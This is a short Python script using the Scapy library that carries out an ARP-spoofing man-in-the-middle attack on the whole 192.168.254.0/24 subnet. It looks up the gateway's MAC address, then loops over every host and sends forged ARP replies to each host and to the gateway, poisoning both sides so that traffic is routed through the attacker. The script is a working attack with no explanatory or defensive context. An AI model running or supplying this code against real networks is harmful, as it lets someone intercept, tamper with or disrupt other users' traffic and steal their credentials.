from scapy.all import *
import time

GW = "192.168.254.254"
YOUR = "192.168.254.22"

def get_mac(ip):
    ans, _ = arping(ip, verbose=0, timeout=2)
    return ans[0][1].hwsrc if ans else None

gw_mac = get_mac(GW)
print(f"Gateway MAC: {gw_mac}")

# Spoof everyone except us
while True:
    for i in range(1, 255):
        ip = f"192.168.254.{i}"
        if ip not in (YOUR, GW):
            m = get_mac(ip)
            if m:
                send(ARP(op=2, pdst=ip, hwdst=m, psrc=GW), verbose=0)
                send(ARP(op=2, pdst=GW, hwdst=gw_mac, psrc=ip), verbose=0)
    time.sleep(3)